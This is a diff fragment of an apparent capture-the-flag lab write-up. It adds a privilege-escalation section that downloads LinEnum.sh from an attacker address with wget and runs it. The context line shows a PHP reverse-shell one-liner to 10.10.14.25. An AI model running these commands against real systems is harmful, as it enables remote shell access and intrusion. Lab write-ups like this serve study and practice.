@@ -130,7 +130,20 @@ php -r '$sock=fsockopen("10.10.14.25",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 ![image](https://user-images.githubusercontent.com/83878909/234566958-ed5cc483-b3da-4cbd-b3f2-74a35ea013d7.png)
 ![image](https://user-images.githubusercontent.com/83878909/234567122-be3e8c54-0a79-4f54-b322-fa634f4d4289.png)
+![image](https://user-images.githubusercontent.com/83878909/234599268-11fda74f-c812-4db5-ac75-450adb9320d4.png)
 
 ---
 
+## Privilege Escalation
+  - Upload `LinEnum.sh`.
+```CSS
+▶ cd /tmp
+▶ wget http://10.10.14.12:5555/LinEnum.sh
+▶ chmod +x LinEnum.sh
+▶ ./LinEnum.sh
+```
 
+![image](https://user-images.githubusercontent.com/83878909/234602152-b1fe2633-a9bc-482a-8cb8-6d7a81accf96.png)
+![image](https://user-images.githubusercontent.com/83878909/234601719-41e0eb4b-49ff-49a5-8ae4-898acc8d58cc.png)
+
+![image](https://user-images.githubusercontent.com/83878909/234607621-64dbdecb-5d29-43ce-a0cf-0d7072cd3c55.png)
